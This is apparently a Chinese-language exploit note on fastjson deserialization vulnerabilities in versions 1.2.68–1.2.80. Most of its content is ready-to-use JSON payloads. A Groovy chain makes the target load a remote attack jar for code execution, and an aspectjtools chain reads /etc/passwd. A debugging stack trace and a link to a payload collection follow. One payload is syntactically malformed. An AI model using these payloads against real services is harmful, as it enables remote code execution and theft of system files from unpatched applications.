并不是从1.2.68< version <= 1.2.80版本都能利用。
```
1.2.73的改动，允许对任意类型的field进行实例化，增加了攻击面。
```
但是1.2.68< version <1.2.73应该并不能利用。



Ref：
- [fastjson1.2.80 payload合集](https://mp.weixin.qq.com/s/SwkJVTW3SddgA6uy_e59qg)


### 最简单也最可能达成的groovy
step1:
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}
```

step2:
```json
{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList":"http://127.0.0.1:81/attack-1.jar"
    }
}
```

### aspectjtools文件读取（1.2.73 <= version <= 1.2.80）

step1:
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}
```

step2:
```
{
    "@type": "java.lang.Class",
    "val": {
        "@type": "java.lang.String" {
            "@type": "java.util.Locale",
            "val": {
                "@type": "com.alibaba.fastjson.JSONObject",
                {
                    "@type": "java.lang.String"
                    "@type": "org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
                    "newAnnotationProcessorUnits": [{}]
                }
            }
		}
```

step3:
```json
{
    "x":{
        "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
        "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
        "fileName":"/etc/passwd"
    }
}
```
![image](https://github.com/shadowsock5/Poc/assets/30398606/1b76cb21-06ef-45a1-b1ab-490d0ad6b009)



对于1.2.73以及之后：
```java
setValue:54, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:124, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
createInstance:1402, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
castToJavaBean:1532, TypeUtils (com.alibaba.fastjson.util)
castToJavaBean:1454, TypeUtils (com.alibaba.fastjson.util)
cast:1079, TypeUtils (com.alibaba.fastjson.util)
cast:1281, TypeUtils (com.alibaba.fastjson.util)
toJavaObject:1219, JSON (com.alibaba.fastjson)
deserialze:294, MiscCodec (com.alibaba.fastjson.serializer)
parseObject:395, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1407, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1373, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:105, StringCodec (com.alibaba.fastjson.serializer)
deserialze:87, StringCodec (com.alibaba.fastjson.serializer)
parseObject:395, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1407, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1373, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:261, MiscCodec (com.alibaba.fastjson.serializer)
parseObject:395, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1407, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1373, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:182, JSON (com.alibaba.fastjson)
parse:192, JSON (com.alibaba.fastjson)
parse:148, JSON (com.alibaba.fastjson)
```
